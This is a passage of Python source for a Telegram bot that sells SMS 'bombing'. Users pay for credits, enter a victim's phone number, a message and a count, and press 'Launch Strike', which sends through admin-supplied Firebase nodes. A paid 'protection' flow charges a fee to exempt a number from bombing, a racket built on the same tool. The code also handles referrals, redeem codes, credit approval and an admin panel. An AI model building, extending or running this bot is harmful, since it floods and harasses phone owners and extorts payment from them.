            f"{ce('clock')} {sc('ᴛɪᴍᴇ')}: {elapsed}ꜱ")
    else:
        d = load()
        u = get_user(d, uid)
        reset_daily(u)
        check_ref_expiry(u)
        gs = d.get("stats", {})
        text = styled_box("ᴍʏ ꜱᴛᴀᴛɪꜱᴛɪᴄꜱ",
            f"{ce('fire')} {sc('ᴅᴀɪʟʏ ᴀᴛᴛᴀᴄᴋꜱ')}: <b>{u['daily_attacks']}</b>\n"
            f"{ce('bolt')} {sc('ᴛᴏᴛᴀʟ ᴀᴛᴛᴀᴄᴋꜱ')}: <b>{u['total_attacks']}</b>\n"
            f"{ce('green')} {sc('ᴛᴏᴛᴀʟ ꜱᴇɴᴛ')}: <b>{u['total_sent']}</b>\n"
            f"{ce('gift')} {sc('ʀᴇꜰᴇʀʀᴀʟꜱ')}: <b>{u['referrals']}</b>\n"
            f"{ce('diamond')} {sc('ʙᴏɴᴜꜱ')}: <b>+{u['bonus_attacks']}</b>\n\n"
            f"{ce('chart')} {sc('ɢʟᴏʙᴀʟ ꜱᴇɴᴛ')}: <b>{gs.get('total_sent', 0)}</b>")
    await cq.message.edit_text(text, reply_markup=back_button(), parse_mode="HTML")

@R.callback_query(F.data == "refer:show")
async def cb_refer(cq: types.CallbackQuery):
    uid = cq.from_user.id
    d = load()
    u = get_user(d, uid)
    bot_un = (await cq.bot.get_me()).username
    link = f"https://t.me/{bot_un}?start={uid}"
    check_ref_expiry(u)
    save(d)
    exp_txt = ""
    if u.get("referral_bonus_expiry"):
        try:
            r = datetime.fromisoformat(u["referral_bonus_expiry"]) - datetime.now()
            if r.total_seconds() > 0:
                exp_txt = f"\n{ce('clock')} {sc('ᴇxᴘɪʀᴇꜱ')}: <b>{int(r.total_seconds()//3600)}ʜ {int((r.total_seconds()%3600)//60)}ᴍ</b>"
        except: pass
    text = styled_box("ʀᴇꜰᴇʀʀᴀʟ ꜱʏꜱᴛᴇᴍ",
        f"{ce('link')} {sc('ʏᴏᴜʀ ʟɪɴᴋ')}:\n<code>{link}</code>\n\n"
        f"{ce('gift')} {sc('ʀᴇᴡᴀʀᴅ/ʀᴇꜰ')}: <b>+500 ᴄʀᴇᴅɪᴛꜱ</b>\n"
        f"{ce('clock')} {sc('ᴅᴜʀᴀᴛɪᴏɴ')}: <b>{REFERRAL_EXPIRY_HOURS}ʜ</b>\n"
        f"{ce('star')} {sc('ᴛᴏᴛᴀʟ ʀᴇꜰꜱ')}: <b>{u['referrals']}</b>\n"
        f"{ce('diamond')} {sc('ʙᴏɴᴜꜱ')}: <b>+{u['bonus_attacks']}</b>{exp_txt}")
    await cq.message.edit_text(text, reply_markup=back_button(), parse_mode="HTML")

@R.callback_query(F.data == "redeem:menu")
async def cb_redeem_menu(cq: types.CallbackQuery, state: FSMContext):
    await state.set_state(Form.redeem_code_input)
    await cq.message.edit_text(
        styled_box("ʀᴇᴅᴇᴇᴍ ᴄᴏᴅᴇ",
        f"{ce('diamond')} {sc('ꜱᴇɴᴅ ʏᴏᴜʀ ᴄᴏᴅᴇ ʙᴇʟᴏᴡ.')}\n\n"
        f"{ce('info')} {sc('ᴇxᴀᴍᴘʟᴇ')}: <code>PREMIUM_ABC123</code>"),
        reply_markup=kb([[btn_danger("Cancel", callback="home", emoji_key="cross")]]), parse_mode="HTML")

@R.message(Form.redeem_code_input)
async def process_redeem(msg: types.Message, state: FSMContext):
    code = msg.text.strip().upper()
    d = load()
    uid = msg.from_user.id
    found = None
    for c in d.get("redeem_codes", []):
        if c["code"] == code:
            found = c
            break
    if not found:
        await msg.answer(f"{ce('cross')} {sc('ɪɴᴠᴀʟɪᴅ ᴄᴏᴅᴇ.')}", parse_mode="HTML")
        return
    if not found.get("is_active", True):
        await msg.answer(f"{ce('cross')} {sc('ᴄᴏᴅᴇ ʜᴀꜱ ᴇxᴘɪʀᴇᴅ.')}", parse_mode="HTML")
        return
    if uid in found.get("used_by", []):
        await msg.answer(f"{ce('cross')} {sc('ᴀʟʀᴇᴀᴅʏ ᴜꜱᴇᴅ.')}", parse_mode="HTML")
        return
    found["used_by"].append(uid)
    found["used_count"] = found.get("used_count", 0) + 1
    if found["used_count"] >= found.get("max_users", 0):
        found["is_active"] = False
    u = get_user(d, uid)
    u["bonus_attacks"] += found.get("daily_attacks", 0) // 10
    save(d)
    await state.clear()
    await msg.answer(styled_box("ᴄᴏᴅᴇ ʀᴇᴅᴇᴇᴍᴇᴅ",
        f"{ce('check')} {sc('ᴄᴏᴅᴇ')}: <code>{code}</code>\n"
        f"{ce('gift')} {sc('ɴᴀᴍᴇ')}: <b>{found.get('custom_name', '-')}</b>\n"
        f"{ce('fire')} {sc('ʙᴏɴᴜꜱ ᴀᴛᴛᴀᴄᴋꜱ')}: <b>+{found.get('daily_attacks', 0) // 10}</b>"),
        reply_markup=back_button(), parse_mode="HTML")

@R.callback_query(F.data == "premium:buy")
async def cb_premium_buy(cq: types.CallbackQuery):
    uid = cq.from_user.id
    text = styled_box("💎 ᴘʀᴇᴍɪᴜᴍ ᴄʀᴇᴅɪᴛꜱ",
        f"{ce('diamond')} {sc('ᴘɪᴄᴋ ᴀ ᴘᴀᴄᴋᴀɢᴇ:')}\n\n"
        f"{ce('money')} <b>500 Credits</b> = <b>10 Rs</b>\n"
        f"{ce('money')} <b>1000 Credits</b> = <b>20 Rs</b>\n"
        f"{ce('money')} <b>2500 Credits</b> = <b>50 Rs</b>\n"
        f"{ce('money')} <b>5000 Credits</b> = <b>100 Rs</b>\n\n"
        f"{ce('info')} {sc('ᴄᴜꜱᴛᴏᴍ ᴘᴀᴄᴋᴀɢᴇ')}? {sc('ᴛᴀᴘ ʙᴇʟᴏᴡ')}:")
    rows = [
        [btn_success("500 - ₹10", callback="premium:pkg:500"), btn_success("1000 - ₹20", callback="premium:pkg:1000")],
        [btn_success("2500 - ₹50", callback="premium:pkg:2500"), btn_success("5000 - ₹100", callback="premium:pkg:5000")],
        [btn_primary("Custom Amount", callback="premium:custom", emoji_key="gift")],
        [btn_danger("Back", callback="home", emoji_key="arrow")]
    ]
    await cq.message.edit_text(text, reply_markup=kb(rows), parse_mode="HTML")

@R.callback_query(F.data.startswith("premium:pkg:"))
async def cb_premium_package(cq: types.CallbackQuery):
    credits = int(cq.data.split(":")[2])
    uid = cq.from_user.id
    d = load()
    user_info = cq.from_user
    user_name = user_info.first_name or user_info.username or str(uid)
    price_rs = credits * 0.02
    
    # Create request (no instant add)
    d["credit_requests"].append({
        "user_id": uid,
        "user_name": user_name,
        "credits": credits,
        "price": price_rs,
        "status": "pending",
        "timestamp": datetime.now().isoformat(),
        "approved_by": None
    })
    save(d)
    await cq.answer()
    
    text = styled_box("⏳ ʀᴇǫᴜᴇꜱᴛ ꜱᴇɴᴛ",
        f"{ce('clock')} {sc('ʏᴏᴜʀ ʀᴇǫᴜᴇꜱᴛ ɪꜱ ᴘᴇɴᴅɪɴɢ')}\n\n"
        f"{ce('gift')} {sc('ᴀᴍᴏᴜɴᴛ')}: <b>{credits} Credits</b>\n"
        f"{ce('money')} {sc('ᴘʀɪᴄᴇ')}: <b>₹{price_rs:.2f}</b>\n\n"
        f"{ce('info')} {sc('ᴀᴅᴍɪɴ ᴡɪʟʟ ᴀᴘᴘʀᴏᴠᴇ ꜱᴏᴏɴ')}")
    
    await cq.message.edit_text(text, reply_markup=kb([[btn_primary("Contact Admin", url=f"https://t.me/{OWNER_USERNAME}", emoji_key="link")], [btn_danger("Back", callback="home", emoji_key="arrow")]]), parse_mode="HTML")
    
    # Notify admin
    try:
        await cq.bot.send_message(OWNER_ID, styled_box("💳 ɴᴇᴡ ᴄʀᴇᴅɪᴛ ʀᴇǫᴜᴇꜱᴛ",
            f"{ce('user')} {sc('ᴜꜱᴇʀ')}: <b>{user_name}</b> (<code>{uid}</code>)\n"
            f"{ce('gift')} {sc('ᴄʀᴇᴅɪᴛꜱ')}: <b>{credits}</b>\n"
            f"{ce('money')} {sc('ᴘʀɪᴄᴇ')}: <b>₹{price_rs:.2f}</b>"),
            reply_markup=kb([[
                btn_success("Approve", callback=f"admin:approve_credit:{uid}:{credits}", emoji_key="check"),
                btn_danger("Reject", callback=f"admin:reject_credit:{uid}", emoji_key="cross")
            ]]), parse_mode="HTML")
    except: pass

@R.callback_query(F.data == "premium:custom")
async def cb_premium_custom(cq: types.CallbackQuery, state: FSMContext):
    await state.set_state(Form.premium_custom_amount)
    await cq.message.edit_text(
        styled_box("💎 ᴄᴜꜱᴛᴏᴍ ᴄʀᴇᴅɪᴛꜱ",
        f"{ce('gift')} {sc('ᴇɴᴛᴇʀ ʜᴏᴡ ᴍᴀɴʏ ᴄʀᴇᴅɪᴛꜱ ʏᴏᴜ ɴᴇᴇᴅ:')}\n\n"
        f"{ce('info')} {sc('ʀᴀᴛᴇ')}: <b>1 Credit = 0.02 Rs</b>"),
        reply_markup=kb([[btn_danger("Cancel", callback="home", emoji_key="cross")]]), parse_mode="HTML")

@R.message(Form.premium_custom_amount)
async def process_custom_credits(msg: types.Message, state: FSMContext):
    try:
        credits = int(msg.text.strip())
        if credits < 100 or credits > 100000:
            await msg.answer(f"{ce('cross')} {sc('ᴇɴᴛᴇʀ ʙᴇᴛᴡᴇᴇɴ 100-100000 ᴄʀᴇᴅɪᴛꜱ.')}", parse_mode="HTML")
            return
        price_rs = credits * 0.02
        d = load()
        uid = msg.from_user.id
        user_name = msg.from_user.first_name or msg.from_user.username or str(uid)
        
        # Create request (no instant add)
        d["credit_requests"].append({
            "user_id": uid,
            "user_name": user_name,
            "credits": credits,
            "price": price_rs,
            "status": "pending",
            "timestamp": datetime.now().isoformat(),
            "approved_by": None
        })
        save(d)
        await state.clear()
        
        await msg.answer(styled_box("⏳ ʀᴇǫᴜᴇꜱᴛ ꜱᴇɴᴛ",
            f"{ce('clock')} {sc('ʏᴏᴜʀ ʀᴇǫᴜᴇꜱᴛ ɪꜱ ᴘᴇɴᴅɪɴɢ')}\n\n"
            f"{ce('gift')} {sc('ᴀᴍᴏᴜɴᴛ')}: <b>{credits} Credits</b>\n"
            f"{ce('money')} {sc('ᴘʀɪᴄᴇ')}: <b>₹{price_rs:.2f}</b>\n\n"
            f"{ce('info')} {sc('ᴀᴅᴍɪɴ ᴡɪʟʟ ᴀᴘᴘʀᴏᴠᴇ ꜱᴏᴏɴ')}"),
            reply_markup=kb([[btn_primary("Contact Admin", url=f"https://t.me/{OWNER_USERNAME}", emoji_key="link")], [btn_danger("Back", callback="home", emoji_key="arrow")]]), parse_mode="HTML")
        
        # Notify admin
        try:
            await msg.bot.send_message(OWNER_ID, styled_box("💳 ɴᴇᴡ ᴄʀᴇᴅɪᴛ ʀᴇǫᴜᴇꜱᴛ",
                f"{ce('user')} {sc('ᴜꜱᴇʀ')}: <b>{user_name}</b> (<code>{uid}</code>)\n"
                f"{ce('gift')} {sc('ᴄʀᴇᴅɪᴛꜱ')}: <b>{credits}</b>\n"
                f"{ce('money')} {sc('ᴘʀɪᴄᴇ')}: <b>₹{price_rs:.2f}</b>"),
                reply_markup=kb([[
                    btn_success("Approve", callback=f"admin:approve_credit:{uid}:{credits}", emoji_key="check"),
                    btn_danger("Reject", callback=f"admin:reject_credit:{uid}", emoji_key="cross")
                ]]), parse_mode="HTML")
        except: pass
    except:
        await msg.answer(f"{ce('cross')} {sc('ɪɴᴠᴀʟɪᴅ ᴀᴍᴏᴜɴᴛ.')}", parse_mode="HTML")

@R.callback_query(F.data.startswith("admin:approve_credit:"))
async def cb_approve_credit(cq: types.CallbackQuery):
    parts = cq.data.split(":")
    uid = int(parts[2])
    credits = int(parts[3])
    d = load()
    
    # Find and remove request
    for req in d.get("credit_requests", []):
        if req["user_id"] == uid and req["credits"] == credits and req["status"] == "pending":
            req["status"] = "approved"
            req["approved_by"] = cq.from_user.id
            break
    
    # Add credits to user
    u = get_user(d, uid)
    u["credits"] = u.get("credits", 0) + credits
    save(d)
    
    await cq.answer(sc("ᴀᴘᴘʀᴏᴠᴇᴅ!"), show_alert=True)
    await cq.message.edit_text(cq.message.text + f"\n\n{ce('check')} {sc('ᴀᴘᴘʀᴏᴠᴇᴅ ʙʏ ᴀᴅᴍɪɴ')}", parse_mode="HTML", reply_markup=None)
    
    # Notify user
    try:
        await cq.bot.send_message(uid, styled_box("✅ ᴄʀᴇᴅɪᴛꜱ ᴀᴘᴘʀᴏᴠᴇᴅ",
            f"{ce('check')} {sc('ʏᴏᴜʀ ʀᴇǫᴜᴇꜱᴛ ᴀᴘᴘʀᴏᴠᴇᴅ!')}\n"
            f"{ce('gift')} {sc('ᴄʀᴇᴅɪᴛꜱ')}: <b>+{credits}</b>\n"
            f"{ce('diamond')} {sc('ʙᴀʟᴀɴᴄᴇ')}: <b>{u['credits']}</b>"), parse_mode="HTML")
    except: pass

@R.callback_query(F.data.startswith("admin:reject_credit:"))
async def cb_reject_credit(cq: types.CallbackQuery):
    uid = int(cq.data.split(":")[3])
    d = load()
    
    # Find and update request
    for req in d.get("credit_requests", []):
        if req["user_id"] == uid and req["status"] == "pending":
            req["status"] = "rejected"
            break
    save(d)
    
    await cq.answer(sc("ʀᴇᴊᴇᴄᴛᴇᴅ!"), show_alert=True)
    await cq.message.edit_text(cq.message.text + f"\n\n{ce('cross')} {sc('ʀᴇᴊᴇᴄᴛᴇᴅ ʙʏ ᴀᴅᴍɪɴ')}", parse_mode="HTML", reply_markup=None)
    
    # Notify user
    try:
        await cq.bot.send_message(uid, styled_box("❌ ʀᴇǫᴜᴇꜱᴛ ʀᴇᴊᴇᴄᴛᴇᴅ",
            f"{ce('cross')} {sc('ʏᴏᴜʀ ʀᴇǫᴜᴇꜱᴛ ᴡᴀꜱ ʀᴇᴊᴇᴄᴛᴇᴅ.')}\n"
            f"{ce('info')} {sc('ᴘʟᴇᴀꜱᴇ ᴄᴏɴᴛᴀᴄᴛ ᴀᴅᴍɪɴ')}"), parse_mode="HTML")
    except: pass

# ════════════════════════════════════════════════════════════
# BOMBING FLOW
# ════════════════════════════════════════════════════════════
@R.callback_query(F.data == "bomb:start")
async def cb_bomb_start(cq: types.CallbackQuery, state: FSMContext):
    uid = cq.from_user.id
    d = load()
    if not await check_fj(cq.bot, uid, FORCE_JOIN_CHANNELS):
        await send_fj_ui(cq, FORCE_JOIN_CHANNELS)
        return
    if not d.get("firebases"):
        await cq.answer(sc("ɴᴏ ꜰɪʀᴇʙᴀꜱᴇ ɴᴏᴅᴇꜱ!"), show_alert=True)
        return
    await state.set_state(Form.bomb_number)
    await cq.message.edit_text(
        styled_box("ᴛᴀʀɢᴇᴛ ᴀᴄǫᴜɪꜱɪᴛɪᴏɴ",
        f"{ce('link')} {sc('ᴇɴᴛᴇʀ ᴛᴀʀɢᴇᴛ ɴᴜᴍʙᴇʀ')}\n\n"
        f"{ce('info')} {sc('ꜰᴏʀᴍᴀᴛ')}: <code>+919876543210</code>\n"
        f"{ce('warn')} {sc('ɪɴᴄʟᴜᴅᴇ ᴄᴏᴜɴᴛʀʏ ᴄᴏᴅᴇ')}"),
        reply_markup=kb([[btn_danger("Cancel", callback="home", emoji_key="cross")]]), parse_mode="HTML")

@R.message(Form.bomb_number)
async def process_number(msg: types.Message, state: FSMContext):
    number = msg.text.strip().replace(" ", "").replace("-", "")
    if not re.match(r'^\+?[0-9]{8,15}$', number):
        await msg.answer(f"{ce('cross')} {sc('ɪɴᴠᴀʟɪᴅ ɴᴜᴍʙᴇʀ.')}", parse_mode="HTML")
        return
    d = load()
    if number in d.get("protected_numbers", []):
        await msg.answer(styled_box("ᴘʀᴏᴛᴇᴄᴛᴇᴅ",
            f"{ce('shield')} {sc('ᴛʜɪꜱ ɴᴜᴍʙᴇʀ ɪꜱ ᴘʀᴏᴛᴇᴄᴛᴇᴅ.')}"), parse_mode="HTML")
        await state.clear()
        return
    await state.update_data(number=number)
    await state.set_state(Form.bomb_message)
    await msg.answer(
        styled_box("ᴍᴇꜱꜱᴀɢᴇ",
        f"{ce('bolt')} {sc('ᴇɴᴛᴇʀ ᴍᴇꜱꜱᴀɢᴇ ᴛᴏ ꜱᴇɴᴅ')}"),
        reply_markup=kb([[btn_danger("Cancel", callback="home", emoji_key="cross")]]), parse_mode="HTML")

@R.message(Form.bomb_message)
async def process_message(msg: types.Message, state: FSMContext):
    m = msg.text.strip()
    if not m:
        await msg.answer(f"{ce('cross')} {sc('ᴍᴇꜱꜱᴀɢᴇ ᴇᴍᴘᴛʏ.')}", parse_mode="HTML")
        return
    await state.update_data(message=m)
    await state.set_state(Form.bomb_count)
    await msg.answer(
        styled_box("ᴄᴏᴜɴᴛ",
        f"{ce('chart')} {sc('ʜᴏᴡ ᴍᴀɴʏ ꜱᴍꜱ?')}\n"
        f"{ce('info')} {sc('ᴍᴀx')}: <b>{MAX_COUNT}</b>"),
        reply_markup=kb([[btn_danger("Cancel", callback="home", emoji_key="cross")]]), parse_mode="HTML")

@R.message(Form.bomb_count)
async def process_count(msg: types.Message, state: FSMContext):
    try:
        count = int(msg.text.strip())
        if count < 1 or count > MAX_COUNT:
            await msg.answer(f"{ce('cross')} {sc(f'ᴄᴏᴜɴᴛ 1-{MAX_COUNT}')}", parse_mode="HTML")
            return
    except:
        await msg.answer(f"{ce('cross')} {sc('ɪɴᴠᴀʟɪᴅ ɴᴜᴍʙᴇʀ.')}", parse_mode="HTML")
        return
    data = await state.get_data()
    number = data.get("number")
    message = data.get("message")
    await state.update_data(pending_count=count)
    await msg.answer(
        styled_box("ᴄᴏɴꜰɪʀᴍ ꜱᴛʀɪᴋᴇ",
        f"{ce('fire')} {sc('ᴛᴀʀɢᴇᴛ')}: <code>{number}</code>\n"
        f"{ce('info')} {sc('ᴍꜱɢ')}: <code>{message[:30]}{'...' if len(message)>30 else ''}</code>\n"
        f"{ce('chart')} {sc('ᴄᴏᴜɴᴛ')}: <b>{count}</b>"),
        reply_markup=kb([
            [btn_danger("Launch Strike", callback="bomb:confirm_launch", emoji_key="fire")],
            [btn_primary("Cancel", callback="home", emoji_key="arrow")],
        ]), parse_mode="HTML")

@R.callback_query(F.data == "bomb:confirm_launch")
async def cb_bomb_confirm(cq: types.CallbackQuery, state: FSMContext):
    data = await state.get_data()
    number = data.get("number")
    message = data.get("message")
    count = data.get("pending_count")
    if not number or not message or not count:
        await cq.answer(sc("ꜱᴇꜱꜱɪᴏɴ ᴇxᴘɪʀᴇᴅ."), show_alert=True)
        await state.clear()
        return
    
    # Credit check: 2 credits per message
    d = load()
    u = get_user(d, cq.from_user.id)
    cost = count * 2
    if u.get("credits", 0) < cost:
        await cq.answer(
            styled_box("ɪɴꜱᴜꜰꜰɪᴄɪᴇɴᴛ ᴄʀᴇᴅɪᴛꜱ",
            f"{ce('cross')} ʏᴏᴜ ɴᴇᴇᴅ <b>{cost}</b> ᴄʀᴇᴅɪᴛꜱ\n"
            f"{ce('gift')} ʏᴏᴜ ʜᴀᴠᴇ <b>{u.get('credits', 0)}</b> ᴄʀᴇᴅɪᴛꜱ"),
            show_alert=True
        )
        return
    
    await state.clear()
    await cq.answer(sc("ʟᴀᴜɴᴄʜɪɴɢ..."))
    await cq.message.edit_text(f"{ce('fire')} {sc('ɪɴɪᴛɪᴀᴛɪɴɢ...')}", parse_mode="HTML")
    await start_bombing(cq.bot, cq.from_user.id, number, message, count)

# ════════════════════════════════════════════════════════════
# PROTECTION FLOW
# ════════════════════════════════════════════════════════════
@R.callback_query(F.data == "protect:start")
async def cb_protect_start(cq: types.CallbackQuery, state: FSMContext):
    await cq.message.edit_text(
        styled_box("ɴᴜᴍʙᴇʀ ᴘʀᴏᴛᴇᴄᴛɪᴏɴ",
        f"{ce('shield')} {sc('ᴘʀᴏᴛᴇᴄᴛ ʏᴏᴜʀ ɴᴜᴍʙᴇʀ ꜰʀᴏᴍ ʙᴏᴍʙɪɴɢ.')}\n\n"
        f"{ce('money')} {sc('ꜰᴇᴇ')}: <b>{PROTECTION_PRICE}</b>\n"
        f"{ce('link')} {sc('ᴜᴘɪ')}: <code>{PAYMENT_UPI}</code>\n\n"
        f"{ce('info')} {sc('ᴀꜰᴛᴇʀ ᴘᴀʏᴍᴇɴᴛ, ꜱᴜʙᴍɪᴛ ʀᴇǫᴜᴇꜱᴛ.')}"),
        reply_markup=kb([
            [btn_success("I Have Paid", callback="protect:paid", emoji_key="money")],
            [btn_primary("Back", callback="home", emoji_key="arrow")],
        ]), parse_mode="HTML")

@R.callback_query(F.data == "protect:paid")
async def cb_protect_paid(cq: types.CallbackQuery, state: FSMContext):
    await state.set_state(Form.protect_txn)
    await cq.message.edit_text(
        styled_box("ᴠᴇʀɪꜰʏ ᴘᴀʏᴍᴇɴᴛ",
        f"{ce('money')} {sc('ᴇɴᴛᴇʀ ᴛʀᴀɴꜱᴀᴄᴛɪᴏɴ ɪᴅ (ᴜᴛʀ/ʀᴇꜰ ɴᴏ.)')}\n\n"
        f"{ce('info')} {sc('ᴇxᴀᴍᴘʟᴇ')}: <code>T123456789012</code>"),
        reply_markup=kb([[btn_danger("Cancel", callback="home", emoji_key="cross")]]), parse_mode="HTML")

@R.message(Form.protect_txn)
async def process_protect_txn(msg: types.Message, state: FSMContext):
    txn = msg.text.strip()
    if len(txn) < 5:
        await msg.answer(f"{ce('cross')} {sc('ɪɴᴠᴀʟɪᴅ ᴛxɴ ɪᴅ.')}", parse_mode="HTML")
        return
    await state.update_data(txn_id=txn)
    await state.set_state(Form.protect_number)
    await msg.answer(
        styled_box("ᴘʀᴏᴛᴇᴄᴛ ɴᴜᴍʙᴇʀ",
        f"{ce('link')} {sc('ᴇɴᴛᴇʀ ᴛʜᴇ ɴᴜᴍʙᴇʀ ᴛᴏ ᴘʀᴏᴛᴇᴄᴛ.')}\n\n"
        f"{ce('info')} {sc('ꜰᴏʀᴍᴀᴛ')}: <code>+919876543210</code>"),
        reply_markup=kb([[btn_danger("Cancel", callback="home", emoji_key="cross")]]), parse_mode="HTML")

@R.message(Form.protect_number)
async def process_protect_number(msg: types.Message, state: FSMContext):
    number = msg.text.strip().replace(" ", "").replace("-", "")
    if not re.match(r'^\+?[0-9]{8,15}$', number):
        await msg.answer(f"{ce('cross')} {sc('ɪɴᴠᴀʟɪᴅ ɴᴜᴍʙᴇʀ.')}", parse_mode="HTML")
        return
    data = await state.get_data()
    txn = data.get("txn_id")
    uid = msg.from_user.id
    uname = msg.from_user.username or msg.from_user.first_name or str(uid)
    d = load()
    req_id = str(int(time.time()))
    d["protection_requests"].append({
        "id": req_id, "user_id": uid, "username": uname,
        "number": number, "txn_id": txn,
        "status": "pending", "time": datetime.now().isoformat(),
    })
    save(d)
    await state.clear()
    await msg.answer(styled_box("ʀᴇǫᴜᴇꜱᴛ ꜱᴇɴᴛ",
        f"{ce('check')} {sc('ʏᴏᴜʀ ᴘʀᴏᴛᴇᴄᴛɪᴏɴ ʀᴇǫᴜᴇꜱᴛ ɪꜱ ᴘᴇɴᴅɪɴɢ.')}"), parse_mode="HTML")

    admin_text = styled_box("ɴᴇᴡ ᴘʀᴏᴛᴇᴄᴛɪᴏɴ ʀᴇǫᴜᴇꜱᴛ",
        f"{ce('eyes')} {sc('ᴜꜱᴇʀ')}: <code>{uid}</code> (@{uname})\n"
        f"{ce('link')} {sc('ɴᴜᴍʙᴇʀ')}: <code>{number}</code>\n"
        f"{ce('money')} {sc('ᴛxɴ')}: <code>{txn}</code>")
    kb_rows = [
        [btn_success("Approve", callback=f"admin:prot_approve:{req_id}", emoji_key="check"),
         btn_danger("Reject", callback=f"admin:prot_reject:{req_id}", emoji_key="cross")],
    ]
    for aid in set(d.get("admins", []) + [OWNER_ID]):
        try:
            await msg.bot.send_message(aid, admin_text, reply_markup=kb(kb_rows), parse_mode="HTML")
        except Exception as e:
            log.warning(f"notify {aid}: {e}")

# ════════════════════════════════════════════════════════════
# ADMIN PANEL
# ════════════════════════════════════════════════════════════
@R.callback_query(F.data == "admin:panel")
async def cb_admin_panel(cq: types.CallbackQuery):
    uid = cq.from_user.id
    d = load()
    if not is_admin(uid, d):
        await cq.answer(sc("ᴀᴅᴍɪɴ ᴏɴʟʏ!"), show_alert=True)
        return
    pending = len([r for r in d.get("protection_requests", []) if r["status"] == "pending"])
    text = styled_box("ᴄᴏᴍᴍᴀɴᴅ ᴄᴇɴᴛʀᴀʟ",
        f"{ce('fire')} {sc('ɴᴏᴅᴇꜱ')}: <b>{len(d.get('firebases', []))}</b>\n"
        f"{ce('date')} {sc('ꜱᴄʜᴇᴅᴜʟᴇꜱ')}: <b>{len(d.get('schedules', []))}</b>\n"
        f"{ce('chart')} {sc('ᴛᴏᴛᴀʟ ꜱᴇɴᴛ')}: <b>{d.get('stats', {}).get('total_sent', 0)}</b>\n"
        f"{ce('crown')} {sc('ᴀᴅᴍɪɴꜱ')}: <b>{len(d.get('admins', []))}</b>\n"
        f"{ce('cross')} {sc('ʙᴀɴɴᴇᴅ')}: <b>{len(d.get('banned', []))}</b>\n"
        f"{ce('shield')} {sc('ᴘᴇɴᴅɪɴɢ')}: <b>{pending}</b>")
    await cq.message.edit_text(text, reply_markup=admin_panel_kb(d), parse_mode="HTML")

@R.callback_query(F.data == "admin:fb_add")
async def cb_fb_add(cq: types.CallbackQuery, state: FSMContext):
    if not is_admin(cq.from_user.id, load()):
        await cq.answer(sc("ᴀᴅᴍɪɴ ᴏɴʟʏ!"), show_alert=True)
        return
    await state.set_state(Form.fb_add_url)
    await cq.message.edit_text(
        styled_box("ᴀᴅᴅ ꜰɪʀᴇʙᴀꜱᴇ",
        f"{ce('fire')} {sc('ꜱᴇɴᴅ ꜰɪʀᴇʙᴀꜱᴇ ᴅᴀᴛᴀʙᴀꜱᴇ ᴜʀʟ')}\n\n"
        f"<code>https://your-project.firebaseio.com</code>"),
        reply_markup=kb([[btn_danger("Cancel", callback="admin:panel", emoji_key="cross")]]), parse_mode="HTML")

@R.message(Form.fb_add_url)
async def process_fb_url(msg: types.Message, state: FSMContext):
    url = msg.text.strip()
    if not url.startswith("https://"):
        await msg.answer(f"{ce('cross')} {sc('ᴜʀʟ ᴍᴜꜱᴛ ꜱᴛᴀʀᴛ ᴡɪᴛʜ https://')}", parse_mode="HTML")
        return
    await state.update_data(fb_url=url.rstrip("/"))
    await state.set_state(Form.fb_add_api)
    await msg.answer(
        styled_box("ᴀᴘɪ ᴋᴇʏ",
        f"{ce('magic')} {sc('ꜱᴇɴᴅ ᴀᴘɪ ᴋᴇʏ ᴏʀ')} <code>skip</code>"),
        reply_markup=kb([[btn_danger("Cancel", callback="admin:panel", emoji_key="cross")]]), parse_mode="HTML")

@R.message(Form.fb_add_api)
async def process_fb_api(msg: types.Message, state: FSMContext):
    api_key = "" if msg.text.strip().lower() == "skip" else msg.text.strip()
    data = await state.get_data()
    d = load()
    d["firebases"].append({"id": str(int(time.time())), "url": data.get("fb_url"), "api_key": api_key})
    save(d)
    await state.clear()
    await msg.answer(f"{ce('check')} {sc('ɴᴏᴅᴇ ᴀᴅᴅᴇᴅ!')}", reply_markup=admin_panel_kb(d), parse_mode="HTML")

@R.callback_query(F.data == "admin:fb_list")
async def cb_fb_list(cq: types.CallbackQuery):
    d = load()
    fbs = d.get("firebases", [])
    if not fbs:
        await cq.answer(sc("ɴᴏ ɴᴏᴅᴇꜱ!"), show_alert=True)
        return
    text = styled_box("ꜰɪʀᴇʙᴀꜱᴇ ɴᴏᴅᴇꜱ",
        "\n".join([f"{ce('fire')} {sc('ɴᴏᴅᴇ')} #{i+1} {ce('check') if fb.get('api_key') else ce('cross')}" for i, fb in enumerate(fbs)]))
    rows = []
    for i, fb in enumerate(fbs):
        rows.append([btn_danger(f"Delete #{i+1}", callback=f"admin:fb_del:{fb['id']}", emoji_key="cross")])
    rows.append([btn_primary("Back", callback="admin:panel", emoji_key="arrow")])
    await cq.message.edit_text(text, reply_markup=kb(rows), parse_mode="HTML")

@R.callback_query(F.data.startswith("admin:fb_del:"))
async def cb_fb_del(cq: types.CallbackQuery):
    fb_id = cq.data.split(":")[2]
    d = load()
    d["firebases"] = [fb for fb in d.get("firebases", []) if fb["id"] != fb_id]
    save(d)
    await cq.answer(sc("ᴅᴇʟᴇᴛᴇᴅ!"), show_alert=True)
    await cb_fb_list(cq)

@R.callback_query(F.data == "admin:protection")
async def cb_admin_protection(cq: types.CallbackQuery):
    d = load()
    pending = [r for r in d.get("protection_requests", []) if r["status"] == "pending"]
    if not pending:
        await cq.answer(sc("ɴᴏ ᴘᴇɴᴅɪɴɢ ʀᴇǫꜱ!"), show_alert=True)
        return
    text = styled_box("ᴘʀᴏᴛᴇᴄᴛɪᴏɴ ʀᴇǫᴜᴇꜱᴛꜱ", "")
    rows = []
    for r in pending[:10]:
        text += f"{ce('eyes')} <code>{r['user_id']}</code> | {ce('link')} <code>{r['number']}</code>\n{ce('money')} <code>{r['txn_id']}</code>\n\n"
        rows.append([
            btn_success("Approve", callback=f"admin:prot_approve:{r['id']}", emoji_key="check"),
            btn_danger("Reject", callback=f"admin:prot_reject:{r['id']}", emoji_key="cross"),
        ])
    rows.append([btn_primary("Back", callback="admin:panel", emoji_key="arrow")])
    await cq.message.edit_text(text, reply_markup=kb(rows), parse_mode="HTML")

@R.callback_query(F.data.startswith("admin:prot_approve:"))
async def cb_prot_approve(cq: types.CallbackQuery):
    req_id = cq.data.split(":")[2]
    d = load()
    req = next((r for r in d["protection_requests"] if r["id"] == req_id), None)
    if not req:
        await cq.answer(sc("ɴᴏᴛ ꜰᴏᴜɴᴅ!"), show_alert=True)
        return
    req["status"] = "approved"
    if req["number"] not in d["protected_numbers"]:
        d["protected_numbers"].append(req["number"])
    save(d)
    await cq.answer(sc("ᴀᴘᴘʀᴏᴠᴇᴅ!"), show_alert=True)
    try:
        await cq.bot.send_message(req["user_id"],
